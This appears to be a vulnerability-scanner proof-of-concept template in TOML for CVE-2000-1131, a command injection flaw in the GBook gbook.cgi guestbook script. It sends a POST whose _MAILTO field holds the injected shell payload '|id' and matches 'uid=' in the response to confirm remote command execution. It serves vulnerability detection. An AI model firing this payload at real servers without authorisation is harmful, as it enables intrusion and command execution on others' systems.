[info]
author = "ave"
description = "检测目标是否存在 Bill Kendrick GBook gbook.cgi 命令注入漏洞，通过向 _MAILTO 表单变量注入 Shell 元字符验证远程命令执行能力"
id = "POC-AVE-2000-1099"
name = "CVE-2000-1131 PoC"
severity = "high"
tags = ["ave-2000-1099"]
vuln_id = [
    "CVE-2000-1131",
    "AVE-2000-1099",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/gbook/gbook.cgi"
protocol = "http"

[poc.requests.body]
content = "_MAILTO=|id"
type = "form"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
